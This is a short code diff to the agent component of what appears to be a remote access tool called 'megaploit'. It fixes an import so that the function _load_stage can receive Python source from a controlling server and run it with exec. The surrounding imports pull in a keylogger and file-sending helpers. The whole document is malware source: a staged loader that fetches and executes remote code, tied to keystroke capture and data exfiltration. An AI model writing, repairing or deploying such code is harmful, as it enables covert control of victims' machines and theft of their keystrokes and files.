@@ -24,7 +24,7 @@ import tempfile
 import threading
 import time
 import zipfile
-from megaploit.core.protocol import send_file as _send_file, send_msg as _send_msg
+from megaploit.core.protocol import send_file as _send_file, send_msg as _send_msg, recv_msg as _recv_msg
 from megaploit.core.config import MAX_RECORD_SECONDS
 from megaploit.agent.keylogger import Keylogger
 
@@ -2472,7 +2472,7 @@ def _load_stage(conn, args: list[str]) -> str:
     The payload arrives as a single message containing Python source.
     """
     try:
-        code = recv_msg(conn)   # wait for stage-1 source
+        code = _recv_msg(conn)   # wait for stage-1 source from the server
         exec(compile(code, "<stage1>", "exec"), {"conn": conn, "__name__": "__stage1__"})
         return "[+] Stage 1 loaded and executed"
     except Exception as e:
